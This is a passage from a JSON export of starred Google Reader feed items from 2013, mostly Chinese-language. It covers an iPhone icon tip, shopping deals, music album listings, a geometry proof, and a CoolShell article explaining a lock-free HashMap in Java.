      "content" : "<div><p>很多喜欢优雅的排列 iPhone 应用图标的朋友一直对系统自带的一些应用图标头疼不已，往往不知道该怎么处理这些删不掉的应用。现在这里有个不错的方法，在不需要越狱的情况下，通过简单的几个步骤就轻松隐藏掉那些你平时不用的系统应用图标！</p>\n\n<p>先一起来看看介绍视频吧！</p>\n\n<p><center><a href=\"http://www.youtube.com/watch?v=CF0IKwViV2I&amp;feature=player_embedded\">点我切换到 YouTube 观看</a></center></p></div>"
    },
    "author" : "iSkuggy",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.iapps.im/feed",
      "title" : "爱应用",
      "htmlUrl" : "http://www.iapps.im"
    }
  }, {
    "crawlTimeMsec" : "1370615243062",
    "timestampUsec" : "1370615243062630",
    "id" : "tag:google.com,2005:reader/item/5dd7c50bfca04936",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh", "鞋帽衣物", "NIKE", "耐克", "跑步鞋" ],
    "title" : "NIKE 耐克 男子跑步系列 NIKE LUNARFLY+ 4 跑步鞋，312元包邮",
    "published" : 1370612435,
    "updated" : 1370612435,
    "alternate" : [ {
      "href" : "http://haitao.me/nike-nike-mens-running-series-nike-lunarfly-4-running-shoes-312-yuan-shipping.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "这款耐克男子跑步鞋，透气网眼多层结构提供轻质像皮肤一样的舒适，可调节中足结构带来 … <a href=\"http://haitao.me/nike-nike-mens-running-series-nike-lunarfly-4-running-shoes-312-yuan-shipping.html\">继续阅读 <span>→</span></a>"
    },
    "author" : "haitao",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://haitao.me/feed/",
      "title" : "海淘迷 - haitao.me",
      "htmlUrl" : "http://haitao.me"
    }
  }, {
    "crawlTimeMsec" : "1370486479957",
    "timestampUsec" : "1370486479957789",
    "id" : "tag:google.com,2005:reader/item/e3720c612efa9a84",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh" ],
    "title" : "[MIT License 开源] iOS Web App Wrapper - 给 web app 在 iOS 加上一个原生的壳",
    "published" : 1370483892,
    "updated" : 1370645384,
    "alternate" : [ {
      "href" : "http://www.v2ex.com/t/71417#reply8",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "Apple 在 Safari 中提供了 &quot;Add To Home Screen&quot; 的功能, 但是它有很多不好用的地方, 例如遇到加载失败时就需要重启, 打开第三方网站的链接后无法返回等等. 于是我写了一个 wrapper 来给 web app 加上一个原生的壳, 这样即使你是 web 开发者也能以 web 的方式来创造一个较为稳定, 流畅的 iOS App.<br><br>ref: <a href=\"http://alexrezit.github.io/WebAppWrapper-iOS/\">http://alexrezit.github.io/WebAppWrapper-iOS/</a><br><br>我以 V2EX 移动版做了一个实例, 可以 checkout V2EX 这个 branch, 图标取自 V2EX 官方的 Home Screen Icon, 版权归 @<a href=\"http://www.v2ex.com/member/Livid\">Livid</a> 所有."
    },
    "author" : "alexrezit",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.v2ex.com/feed/tab/all.xml",
      "title" : "V2EX - 全部",
      "htmlUrl" : "http://www.v2ex.com/"
    }
  }, {
    "crawlTimeMsec" : "1370486458154",
    "timestampUsec" : "1370486458154819",
    "id" : "tag:google.com,2005:reader/item/947cc9a50e58ef25",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh", "淘宝9块9", "鞋帽衣物", "GAP" ],
    "title" : "GAP中国：端午节促销 全场买5件 全单七折",
    "published" : 1370485786,
    "updated" : 1370485786,
    "alternate" : [ {
      "href" : "http://haitao.me/gap-china-dragon-boat-festival-promotions-audience-to-buy-5-off-total-bill.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "GAP庆祝龙舟节活动，全场满买5件，全单七折，活动包括男装、女装、童装，适合全家 … <a href=\"http://haitao.me/gap-china-dragon-boat-festival-promotions-audience-to-buy-5-off-total-bill.html\">继续阅读 <span>→</span></a>"
    },
    "author" : "haitao",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://haitao.me/feed/",
      "title" : "海淘迷 - haitao.me",
      "htmlUrl" : "http://haitao.me"
    }
  }, {
    "crawlTimeMsec" : "1370344938893",
    "timestampUsec" : "1370344938893136",
    "id" : "tag:google.com,2005:reader/item/a27e0b1810045de8",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh" ],
    "title" : "Sandisk 闪迪 Ultra 至尊高速 64GB TF存储卡（Class10、UHS-1、SD适配器）　264元（289-25）",
    "published" : 1370253868,
    "updated" : 1370253868,
    "alternate" : [ {
      "href" : "http://www.smzdm.com/youhui/232341",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>Sandisk的高端存储卡通常分为Ultra（中文名至尊高速）和Extreme（至尊极速）两种，今天推荐的这款卡为Ultra 至尊高速，容量64GB，符合最新的存储卡速度规范UHS-1（Ultra High Speed）以及Class10级别，标称可以达到30MB/s，足以满足一般使用需求。附送SD卡适配器。</p>\n<p>易迅网目前特价至289元，已经是历史低价，还可叠加使用200-25元券，实付264元。其他渠道价格一般在300左右，有需要的朋友现在入手还是挺划算的。</p>\n<p> </p>\n<p><a href=\"http://www.smzdm.com/youhui/232341\">购买详情链接</a><br><img src=\"http://pn.zdmimg.com/201306/03/28fd5d21.jpg_n1.jpg\" alt=\"\"></p>\n<p>Sandisk 闪迪 Ultra 至尊高速 64GB TF存储卡（Class10、UHS-1、SD适配器）　264元（289-25），首发于什么值得买。</p><p>本文来自<a href=\"http://www.smzdm.com/youhui/232341\">什么值得买网站（www.smzdm.com）</a>。</p>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feed.smzdm.com/",
      "title" : "什么值得买",
      "htmlUrl" : "http://www.smzdm.com"
    }
  }, {
    "crawlTimeMsec" : "1370163531773",
    "timestampUsec" : "1370163531773297",
    "id" : "tag:google.com,2005:reader/item/c02b9bfd5fabed05",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh", "京东618活动专题", "鞋帽衣物", "adidas", "跑步鞋", "阿迪达斯" ],
    "title" : "阿迪达斯 adidas 男子跑步鞋，212包邮",
    "published" : 1370152400,
    "updated" : 1370152400,
    "alternate" : [ {
      "href" : "http://haitao.me/adidas-adidas-mens-running-shoes-212-free-shipping.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "这款阿迪达斯男士跑步鞋，鞋面采用网布和合成皮革材质，鞋底有缓震胶科技的运用，具有 … <a href=\"http://haitao.me/adidas-adidas-mens-running-shoes-212-free-shipping.html\">继续阅读 <span>→</span></a>"
    },
    "author" : "haitao",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://haitao.me/feed/",
      "title" : "海淘迷 - haitao.me",
      "htmlUrl" : "http://haitao.me"
    }
  }, {
    "crawlTimeMsec" : "1370075147484",
    "timestampUsec" : "1370075147484535",
    "id" : "tag:google.com,2005:reader/item/8b279e1d57abdae6",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh", "Brain Storm", "几何", "证明" ],
    "title" : "经典证明：等边三角形内一点到各顶点的距离长可构成一个三角形",
    "published" : 1313142553,
    "updated" : 1313142553,
    "alternate" : [ {
      "href" : "http://www.matrix67.com/blog/archives/4545",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>    这是初中平面几何的一个经典问题：等边三角形 ABC 内有任意一点 P，求证 PA 、 PB 、 PC 的长度一定能构成一个三角形。</p>\n<p>      <img src=\"http://www.matrix67.com/blogimage_2011/201108121.png\" alt=\"\"></p>\n<p><span></span><br>\n <br>\n <br>\n <br>\n <br>\n <br>\n <br>\n <br>\n <br>\n <br>\n <br>\n <br>\n <br>\n      <img src=\"http://www.matrix67.com/blogimage_2011/201108122.png\" alt=\"\"></p>\n<p>    这里给出两种证明方法。传统的证明方法是，把 △CPA 绕着点 C 逆时针旋转 60 度，从而旋转后的 CA 将会和 CB 重合，同时 P 点落在了 P&#39; 的位置。由于 △CP&#39;B 是由 △CPA 旋转过去得到的，因此 P&#39;B = PA 。另外，线段 CP&#39; 是 CP 绕着点 C 旋转 60 度得到的，说明 CP 和 CP&#39; 长度相等且夹角为 60 度，即 △CPP&#39; 是等边三角形，于是 PP&#39; = CP 。那么， △BPP&#39; 的三边长事实上分别等于 PA 、 PB 、 PC ，命题得证。</p>\n<p> <br>\n <br>\n      <img src=\"http://www.matrix67.com/blogimage_2011/201108123.png\" alt=\"\"></p>\n<p>    今天我学到了另外一种证明方法，看上去更简洁巧妙一些。过点 P 分别作三边的平行线，将整个三角形划分为三个蓝色四边形。那么，图中的三个蓝色四边形都有一组对边平行，因而他们都是梯形；事实上，容易看出，这些梯形的两个底角都是 60 度，因而他们都是等腰梯形。只需注意到，等腰梯形的两条对角线长度是相等的，因此红色三角形 A&#39;B&#39;C&#39; 的三边长度事实上就分别等于 PA 、 PB 、 PC ，命题得证。</p>\n<p>来源：<a href=\"http://www.cut-the-knot.org/Curriculum/Geometry/Pompeiu2.shtml\">http://www.cut-the-knot.org/Curriculum/Geometry/Pompeiu2.shtml</a></p><img src=\"http://www1.feedsky.com/t1/561784791/matrix67/feedsky/s.gif?r=http://www.matrix67.com/blog/archives/4545\" border=\"0\" height=\"0\" width=\"0\">"
    },
    "author" : "Matrix67",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.matrix67.com/blog/feed.asp",
      "title" : "Matrix67: My Blog",
      "htmlUrl" : "http://www.matrix67.com/blog"
    }
  }, {
    "crawlTimeMsec" : "1370026308504",
    "timestampUsec" : "1370026308504307",
    "id" : "tag:google.com,2005:reader/item/09cc878d439c9b5f",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh" ],
    "title" : "Olivia Ong -《等等》2013[FLAC]",
    "published" : 1369992130,
    "updated" : 1369992130,
    "alternate" : [ {
      "href" : "http://www.verycd.com/topics/2954752/",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<img src=\"http://i-7.vcimg.com/crop/ce4ac9c649bf6df3acc45e626b687dbe124840(280x)/thumb.jpg\" alt=\"Olivia Ong -《等等》2013[FLAC]\" style=\"float:right;padding:0 0 10px 10px\">\n\t\t\t\t专辑中文名: 等等<br>歌手: Olivia Ong<br>音乐风格: 流行<br>资源格式: FLAC<br>版本: 2013<br>发行时间: 2013年05月17日<br>地区: 台湾<br>语言: 普通话<br>简介: <br>唱片公司：华研国际<br>唱片编号：HIM2111A1<br>比 特 率 ：859 kbit/s<br>专辑介绍：<br>亚洲美声歌姬 Olivia Ong 奥莉维亚(王俪婷)<br>台湾歌坛三年淬炼，流行乐界首席优美女声，历年专辑成绩创下卖座好口碑！<br>2013全新音乐专辑「等等」Olivia美声轻唱渡假音乐，精挑细选11首舒心好歌！<br>台湾歌坛三年淬练 流行乐界首席优美女声心音乐<br>进入台湾乐坛三年以来发行过两张专辑，演唱实力备受肯定，创下华语乐坛卖座好口碑！Olivia独特吟唱方式，站稳流行乐界首席优美女声地位！<br>百分百全心突破 Olivia首次尝试中文歌词创作<br>Olivia词/曲/唱多方投入，精挑细选11首舒心好歌深刻诠释，音乐景色全心开阔！整张专辑收录浪漫抒情、中国风、拉丁、爵士、民谣、摇滚元素等多元曲风！Olivia与资深音乐人陈佳明合作，首次执笔中文歌词创作「我在想」完整收录！<br>第一波漫活主打「等等」 Olivia自在哼唱生活心体会<br>夏日漫游步调的抒情歌曲，旋律、编曲充满漫活度假氛围。Olivia温柔与坚定兼具的演绎方式，唱出生活中的心体会，唱给城市中渴望放慢脚步的你。MV营造一个人的日常生活旅程，每一段悠扬音乐串起生活的独特片刻，犹如被缓缓洒下的阳光包围，赤脚漫游般的度假风情。<br>第二波沉溺主打「爱够了」<br>新生代创作人廖文强、资深音乐人陈佳明，联手打造Olivia深刻国语情歌。在爱情蒸发了之后，还有回忆的温度可以沉溺过去…Olivia的抒情慢歌，感性与理性的双面个性，漫延着回荡不散的后座力。<br>免责声明：本音乐来自网络仅为宣传试听，感谢原作者，若鉴赏高品质音乐请购买正版CD！<br>专辑曲目: <br>        01. 同化<br>02. 等等<br>03. 不化妆舞会<br>04. 我在想<br>05. 幸福记号<br>06. 对了,我错了<br>07. 大不了<br>08. 爱够了<br>09. 不变<br>10. 守望<br>11. Bonus Track ( Wonderland Samsung GALAXY Wonderland 主题曲 )        <br><a href=\"http://www.verycd.com/topics/2954752/#theCom\">评论(19) </a>  <a href=\"http://www.verycd.com/topics/2954752/\">收藏(4) </a>  <a href=\"http://www.verycd.com/topics/2954752/\">查看完整资源页</a><br>"
    },
    "author" : "梁伟民",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.verycd.com/sto/music/feed",
      "title" : "首页 音乐  VeryCD电驴大全 - 电驴资源订阅",
      "htmlUrl" : "http://www.verycd.com/sto/music/"
    }
  }, {
    "crawlTimeMsec" : "1370000281602",
    "timestampUsec" : "1370000281602666",
    "id" : "tag:google.com,2005:reader/item/0263b27305765b90",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh" ],
    "title" : "李玟 -《盛开》2013[MP3]",
    "published" : 1369992187,
    "updated" : 1369992187,
    "alternate" : [ {
      "href" : "http://www.verycd.com/topics/2954772/",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<img src=\"http://i-7.vcimg.com/crop/8d192ff64237e833fcd4b5b49652ab44123902(280x)/thumb.jpg\" alt=\"李玟 -《盛开》2013[MP3]\" style=\"float:right;padding:0 0 10px 10px\">\n\t\t\t\t专辑中文名: 盛开<br>歌手: 李玟<br>音乐风格: 流行<br>资源格式: MP3<br>版本: 2013<br>发行时间: 2013年05月31日<br>地区: 台湾<br>语言: 普通话<br>简介: <br>制作发行：环球唱片<br>音乐格式：320kb/MP3 <br>专辑介绍： <br>【天后再临 光芒盛开】流行天后CoCo李玟加盟环球音乐首张专辑「盛开」。金曲制作人阿弟仔、陈子鸿、Jim Lee联手打造，在人生最美好的时候 听见最动人的CoCo李玟。融会丰富演艺经历与人生体悟「盛开」最璀璨的耀眼光芒。<br>与上一张专辑相隔四年后，CoCo李玟推出全新个人专辑「盛开」。再次出片，CoCo的心情可说是「迫不及待」！她心中最热爱的依然是音乐表演事业，她说：「站在舞台上表演，是最快乐的事情！」近来除了担任歌唱选秀节目的评审之外，CoCo其实从去年开始就已默默在进行新专辑的筹备、录音工作。<br>新专辑取名为「盛开」，是因为现在的CoCo李玟正处於一个女人最美好、最幸福的状态，她拥有丰富的音乐经历与纯熟完美的演唱技巧，再加上这段时间的人生体验，现在的CoCo充满了能量，就像盛开的花朵，以最美丽的姿态，绽放出亮眼的光芒！<br>这次跟CoCo合作专辑中5首歌的金曲制作人阿弟仔说：「能跟CoCo这样的国际巨星合作是很大的荣幸，也是一个音乐人能够很好发挥的机会！无论是电子舞曲、欧式disco、R&amp;B情歌、R&amp;B Hip Hop、重节奏中版歌，CoCo都能唱出属於自己的感觉，在各种不同曲风当中都能诠释得游刃有余！」<br>推荐歌曲<br>《叩叩》CoCo李玟可以说是开启台湾的流行舞曲风潮的第一天后，历年作品从「DiDaDi」、「刀马旦」、「真情人」以来，都是大家疯狂播放、模仿的对象，需要欢乐热力时第一个就想到CoCo。首先曝光的新舞曲「叩叩」由金曲制作人阿弟仔为CoCo量声写作，运用最流行的欧式Disco电音节奏，阿弟仔巧思采用CoCo的谐音化作敲门声「叩叩」，歌词非常贴近CoCo开朗热情的个性，描述封闭的灵魂与压抑的感情正在等待解放，只等心爱的人来敲开心门！<br>《能不能》「能不能」是一首urban R&amp;B曲风的情歌，歌词叙述当一段爱情走到尽头，过去的甜蜜只剩回忆，真爱被时间蚕食鲸吞，但心里还存留着最后一丝希望，能不能再给我一点温暖，你愿不愿意继续坚持，能不能让这份爱撑下去？CoCo在这首歌当中展现了她纯熟完美的演唱功力，从内敛的低音酝酿、情绪澎湃的高音到恰到好处的R&amp;B转音，CoCo用歌声抚慰了痴心人的心情，也希望大家在遇到感情僵局时能够懂得珍惜彼此，能不能多坚持一下，多为对方想，或许就有机会继续走下去。<br>《Stuck On U 偷心贼》Stuck On U偷心贼是一首采用了复古元素的中板舞曲，有60年代Motown式的节奏音色与和声方式、热闹的big band铜管乐器，融合现代舞曲节奏。制作人陈子鸿开发出大家从没听过的CoCo李玟全新唱腔，保有CoCo原本的甜美特质之外，加入黑人式的骚灵唱腔，充满戏剧感。新锐词人吴易纬填写的歌词与曲搭配得天衣无缝，将Stuck on U被你迷住的感觉结合「偷心贼」概念，CoCo唱出心被偷走了那种既甜蜜又晕眩的感觉。<br>《想念你的夜》「想念你的夜」是苏打绿青峯特别为CoCo写的一首温暖动人的情歌，由苏打绿阿龚编曲，采用了钢琴、弦乐与band sound。在这首歌里青峯并没有故意写一些高难度的旋律或是让CoCo大耍花腔，反而用最平实的旋律与细腻的歌词来让听者感动。歌词描述彼此分离时的思念，多麽期待能再相聚，这个对象可能是爱人、亲人、好友，任何你思念的人。CoCo内敛而温暖的唱腔、真挚的感情让人听了带着微笑，想念起心里的那个人。<br>《盛开》词: 陈宏宇 曲: 梁永泰(terrytyelee) 编曲: 蔡庭贵 制作人: 阿弟仔。「盛开」是这张专辑最具摇滚精神的歌曲，也是CoCo的跨界崭新尝试。这首歌编曲气势非常磅礡，带有歌德式摇滚的元素在里面，CoCo在间奏亲身上阵演唱了一段花腔女高音，展现高难度的唱功技巧。歌词则是描述艺人在台下咬牙苦练，即使伤痕累累，站上舞台时依然尽全力表演，纵情盛开，绽放最灿烂迷人的魅力。歌词意寓的反骨奋起精神，正是CoCo李玟进入歌坛以来一直保持的战斗心态、敬业精神与对完美追求的自我告白，也是这整张专辑的主题。<br>免责声明：本音乐来自网络仅为宣传试听，感谢原作者，若喜欢请购买正版CD鉴藏！<br>专辑曲目: <br>        01. 叩叩<br>02. Stuck On U 偷心贼<br>03. 能不能<br>04. 爱的副作用<br>05. Party Queen<br>06. 想念你的夜<br>07. 盛开<br>08. 一加一<br>09. 双人舞<br>10. Match Made In Heaven<br>11. I Just Wanna Marry You        <br><a href=\"http://www.verycd.com/topics/2954772/#theCom\">评论(68) </a>  <a href=\"http://www.verycd.com/topics/2954772/\">收藏(19) </a>  <a href=\"http://www.verycd.com/topics/2954772/\">查看完整资源页</a><br>"
    },
    "author" : "和荔",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.verycd.com/sto/music/feed",
      "title" : "首页 音乐  VeryCD电驴大全 - 电驴资源订阅",
      "htmlUrl" : "http://www.verycd.com/sto/music/"
    }
  }, {
    "crawlTimeMsec" : "1369933693604",
    "timestampUsec" : "1369933693604143",
    "id" : "tag:google.com,2005:reader/item/e4b3885d573c968d",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/fresh", "Java语言", "程序设计", "Hash", "HashMap", "Java", "Performance", "多线程", "并发" ],
    "title" : "无锁HashMap的原理与实现",
    "published" : 1369920680,
    "updated" : 1369920680,
    "alternate" : [ {
      "href" : "http://coolshell.cn/articles/9703.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p><strong> (本文由<a href=\"https://github.com/onetwogoo\" rel=\"author\">onetwogoo</a>投稿)</strong></p>\n<p>在《<a title=\"疫苗：Java HashMap的死循环\" href=\"http://coolshell.cn/articles/9606.html\">疫苗：Java HashMap的死循环</a>》中，我们看到，java.util.HashMap并不能直接应用于多线程环境。对于多线程环境中应用HashMap，主要有以下几种选择：</p>\n<ol>\n<li><span style=\"line-height:13px\">使用线程安全的java.util.Hashtable作为替代。</span></li>\n<li>使用java.util.Collections.synchronizedMap方法，将已有的HashMap对象包装为线程安全的。</li>\n<li>使用java.util.concurrent.ConcurrentHashMap类作为替代，它具有非常好的性能。</li>\n</ol>\n<p>而以上几种方法在实现的具体细节上，都或多或少地用到了互斥锁。互斥锁会造成线程阻塞，降低运行效率，并有可能产生死锁、优先级翻转等一系列问题。</p>\n<p>CAS(Compare And Swap)是一种底层硬件提供的功能，它可以将判断并更改一个值的操作原子化。关于CAS的一些应用，《<a title=\"无锁队列的实现\" href=\"http://coolshell.cn/articles/8239.html\">无锁队列的实现</a>》一文中有很详细的介绍。</p>\n<h4>Java中的原子操作</h4>\n<p>在java.util.concurrent.atomic包中，Java为我们提供了很多方便的原子类型，它们底层完全基于CAS操作。</p>\n<p>例如我们希望实现一个全局公用的计数器，那么可以：</p>\n<p> </p>\n<pre>private AtomicInteger counter = new AtomicInteger(3);\n\npublic void addCounter() {\n    for (;;) {\n        int oldValue = counter.get();\n        int newValue = oldValue + 1;\n        if (counter.compareAndSet(oldValue, newValue))\n            return;\n    }\n}</pre>\n<p><span></span></p>\n<p>其中，compareAndSet方法会检查counter现有的值是否为oldValue，如果是，则将其设置为新值newValue，操作成功并返回true；否则操作失败并返回false。</p>\n<p>当计算counter新值时，若其他线程将counter的值改变，compareAndSwap就会失败。此时我们只需在外面加一层循环，不断尝试这个过程，那么最终一定会成功将counter值+1。（其实AtomicInteger已经为常用的+1/-1操作定义了incrementAndGet与decrementAndGet方法，以后我们只需简单调用它即可）</p>\n<p>除了AtomicInteger外，java.util.concurrent.atomic包还提供了AtomicReference和AtomicReferenceArray类型，它们分别代表原子性的引用和原子性的引用数组（引用的数组）。</p>\n<h4>无锁链表的实现</h4>\n<p>在实现无锁HashMap之前，让我们先来看一下比较简单的无锁链表的实现方法。</p>\n<p>以插入操作为例：</p>\n<ol>\n<li><span style=\"line-height:13px\">首先我们需要找到待插入位置前面的节点A和后面的节点B。</span></li>\n<li><span style=\"line-height:13px\">然后新建一个节点C，并使其next指针指向节点B。（见图1）</span></li>\n<li>最后使节点A的next指针指向节点C。（见图2）</li>\n</ol>\n<p><img alt=\"\" src=\"http://coolshell.cn//wp-content/uploads/2013/05/%E5%9B%BE1-3.jpg\" width=\"600\" height=\"479\"></p>\n<p>但在操作中途，有可能其他线程在A与B直接也插入了一些节点（假设为D），如果我们不做任何判断，可能造成其他线程插入节点的丢失。（见图3）我们可以利用CAS操作，在为节点A的next指针赋值时，判断其是否仍然指向B，如果节点A的next指针发生了变化则重试整个插入操作。大致代码如下：</p>\n<pre>private void listInsert(Node head, Node c) {\n    for (;;) {\n        Node a = findInsertionPlace(head), b = a.next.get();\n        c.next.set(b);\n        if (a.next.compareAndSwap(b,c))\n            return;\n    }\n}</pre>\n<p>(Node类的next字段为AtomicReference&lt;Node&gt;类型，即指向Node类型的原子性引用)</p>\n<p>无锁链表的查找操作与普通链表没有区别。而其删除操作，则需要找到待删除节点前方的节点A和后方的节点B，利用CAS操作验证并更新节点A的next指针，使其指向节点B。</p>\n<h4>无锁HashMap的难点与突破</h4>\n<p>HashMap主要有<strong>插入</strong>、<strong>删除</strong>、<strong>查找</strong>以及<strong>ReHash</strong>四种基本操作。一个典型的HashMap实现，会用到一个数组，数组的每项元素为一个节点的链表。对于此链表，我们可以利用上文提到的操作方法，执行插入、删除以及查找操作，但对于ReHash操作则比较困难。</p>\n<p><img alt=\"\" src=\"http://coolshell.cn//wp-content/uploads/2013/05/%E5%9B%BE4.jpg\" width=\"648\" height=\"265\"></p>\n<p>如图4，在ReHash过程中，一个典型的操作是遍历旧表中的每个节点，计算其在新表中的位置，然后将其移动至新表中。期间我们需要操纵3次指针：</p>\n<ol>\n<li>将A的next指针指向D</li>\n<li>将B的next指针指向C</li>\n<li>将C的next指针指向E</li>\n</ol>\n<p>而这三次指针操作必须同时完成，才能保证移动操作的原子性。但我们不难看出，CAS操作每次只能保证<strong>一个</strong>变量的值被原子性地验证并更新，无法满足同时验证并更新三个指针的需求。</p>\n<p>于是我们不妨换一个思路，既然移动节点的操作如此困难，我们可以使所有节点始终保持有序状态，从而避免了移动操作。在典型的HashMap实现中，数组的长度始终保持为2<sup>i</sup>，而从Hash值映射为数组下标的过程，只是简单地对数组长度执行取模运算（即仅保留Hash二进制的后i位）。当ReHash时，数组长度加倍变为2<sup>i+1</sup>，旧数组第j项链表中的每个节点，要么移动到新数组中第j项，要么移动到新数组中第j+2<sup>i</sup>项，而它们的唯一区别在于Hash值第i+1位的不同（第i+1位为0则仍为第j项，否则为第j+2<sup>i</sup>项）。</p>\n<p style=\"text-align:center\"><img alt=\"\" src=\"http://coolshell.cn//wp-content/uploads/2013/05/%E5%9B%BE5-6.jpg\" width=\"690\" height=\"297\"></p>\n<p>如图5，我们将所有节点按照Hash值的翻转位序（如1101-&gt;1011）由小到大排列。当数组大小为8时，2、18在一个组内；3、11、27在另一个组内。每组的开始，插入一个哨兵节点，以方便后续操作。为了使哨兵节点正确排在组的最前方，我们将正常节点Hash的最高位（翻转后变为最低位）置为1，而哨兵节点不设置这一位。</p>\n<p>当数组扩容至16时（见图6），第二组分裂为一个只含3的组和一个含有11、27的组，但节点之间的相对顺序并未改变。这样在ReHash时，我们就不需要移动节点了。</p>\n<h4>实现细节</h4>\n<p>由于扩容时数组的复制会占用大量的时间，这里我们采用了将整个数组分块，懒惰建立的方法。这样，当访问到某下标时，仅需判断此下标所在块是否已建立完毕（如果没有则建立）。</p>\n<p>另外定义size为当前已使用的下标范围，其初始值为2，数组扩容时仅需将size加倍即可；定义count代表目前HashMap中包含的总节点个数（不算哨兵节点）。</p>\n<p>初始时，数组中除第0项外，所有项都为null。第0项指向一个仅有一个哨兵节点的链表，代表整条链的起点。初始时全貌见图7，其中浅绿色代表当前未使用的下标范围，虚线箭头代表逻辑上存在，但实际未建立的块。</p>\n<p><img alt=\"\" src=\"http://coolshell.cn//wp-content/uploads/2013/05/%E5%9B%BE7.jpg\" width=\"446\" height=\"282\"></p>\n<h5>初始化下标操作</h5>\n<p>数组中为null的项都认为处于未初始化状态，初始化某个下标即代表建立其对应的哨兵节点。初始化是递归进行的，即若其父下标未初始化，则先初始化其父下标。（一个下标的父下标是其移除最高二进制位后得到的下标）大致代码如下：</p>\n<pre>private void initializeBucket(int bucketIdx) {\n    int parentIdx = bucketIdx ^ Integer.highestOneBit(bucketIdx);\n    if (getBucket(parentIdx) == null)\n        initializeBucket(parentIdx);\n\n    Node dummy = new Node();\n    dummy.hash = Integer.reverse(bucketIdx);\n    dummy.next = new AtomicReference&amp;lt;&amp;gt;();\n\n    setBucket(bucketIdx, listInsert(getBucket(parentIdx), dummy));\n}</pre>\n<p>其中getBucket即封装过的获取数组某下标内容的方法，setBucket同理。listInsert将从指定位置开始查找适合插入的位置插入给定的节点，若链表中已存在hash相同的节点则返回那个已存在的节点；否则返回新插入的节点。</p>\n<h5>插入操作</h5>\n<ul>\n<li>首先用HashMap的size对键的hashCode取模，得到应插入的数组下标。</li>\n<li>然后判断该下标处是否为null，如果为null则初始化此下标。</li>\n<li>构造一个新的节点，并插入到适当位置，注意节点中的hash值应为原hashCode经过位翻转并将最低位置1之后的值。</li>\n<li>将节点个数计数器加1，若加1后节点过多，则仅需将size改为size*2，代表对数组扩容（ReHash）。</li>\n</ul>\n<h5>查找操作</h5>\n<ul>\n<li>找出待查找节点在数组中的下标。</li>\n<li>判断该下标处是否为null，如果为null则返回查找失败。</li>\n<li>从相应位置进入链表，顺次寻找，直至找出待查找节点或超出本组节点范围。</li>\n</ul>\n<h5>删除操作</h5>\n<ul>\n<li><span style=\"line-height:13px\">找出应删除节点在数组中的下标。</span></li>\n<li>判断该下标处是否为null，如果为null则初始化此下标。</li>\n<li>找到待删除节点，并从链表中删除。（注意由于哨兵节点的存在，任何正常元素只被其唯一的前驱节点所引用，不存在被前驱节点与数组中指针同时引用的情况，从而不会出现需要同时修改多个指针的情况）</li>\n<li>将节点个数计数器减1。</li>\n</ul>\n<h4>参考文献</h4>\n<p><a title=\"《Split-Ordered Lists: Lock-Free Extensible Hash Tables》\" href=\"http://www.cs.ucf.edu/~dcm/Teaching/COT4810-Spring2011/Literature/SplitOrderedLists.pdf\">《Split-Ordered Lists: Lock-Free Extensible Hash Tables》</a></p>\n<p>（全文完）\n<div style=\"margin-top:15px;font-size:11px;color:#cc0000\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"http://coolshell.cn/\">酷壳 – CoolShell.cn</a> ，请勿用于任何商业用途）</strong></p></div>\n<div style=\"text-align:center;padding:0px;font-size:14px;margin-bottom:50px\">——=== <b>访问 <a href=\"http://coolshell.cn/404/\">酷壳404页面</a> 以支持公益事业</b> ===——</div>\n\n<div><div><h3>相关文章</h3><ul><li>2013年05月10日 -- <a href=\"http://coolshell.cn/articles/9606.html\">疫苗：Java HashMap的死循环</a></li><li>2012年11月22日 -- <a href=\"http://coolshell.cn/articles/8638.html\">为什么不能用微信或米聊这类的软件</a></li><li>2012年01月06日 -- <a href=\"http://coolshell.cn/articles/6424.html\">Hash Collision DoS 问题</a></li><li>2012年07月13日 -- <a href=\"http://coolshell.cn/articles/7886.html\">代码执行的效率</a></li><li>2012年06月20日 -- 